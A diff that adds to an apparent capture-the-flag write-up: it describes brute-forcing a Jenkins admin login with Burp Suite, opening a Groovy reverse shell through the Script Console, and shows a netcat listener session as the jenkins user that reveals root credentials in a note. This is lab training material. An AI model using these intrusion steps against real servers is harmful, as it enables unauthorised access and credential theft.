@@ -247,3 +247,40 @@ YOUR_IP:8080  →  THM_TargetP_IP (SSH server as aubreanna)  →  172.17.0.2:808
 This creates a listener on YOUR_IP 127.0.0.1:8080 forwards traffic via encrypted SSH connection to the 172.17.0.2:8080 much the same way used to connect VNC connection via secure SSH connection. To view the website just access 127.0.0.1:8080 in browser not to connect to the target 172.17.0.2:8080. 
 
 This gives us the jenkins site similar to ALFRED CTF. A common user name was Admin I started with that with a brute force attack.
+So I used a Burpe Suite in similar way.
+End up with username: admin password:spongebob
+
+- Then accessing the jenkins login with these credentials
+- Select "Manage Jenkins" then scroll down and use "Script Console"
+- Jenkins uses Groovy in script console so get a reverse shell in Groovy and after inserted and listener is waiting select run. You should connect.
+
+```
+                                                                                                                           
+┌──(hacktopuser㉿hacktop)-[~]
+└─$ rlwrap nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [192.168.159.255] from (UNKNOWN) [10.48.183.184] 57030
+whoami
+jenkins
+id
+uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
+pwd
+/
+cd /opt
+pwd
+/opt
+ls
+note.txt
+cat note.txt
+Aubreanna,
+
+Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
+need access to the root user account.
+
+root:tr0ub13guM!@#123
+
+
+
+
+```
+
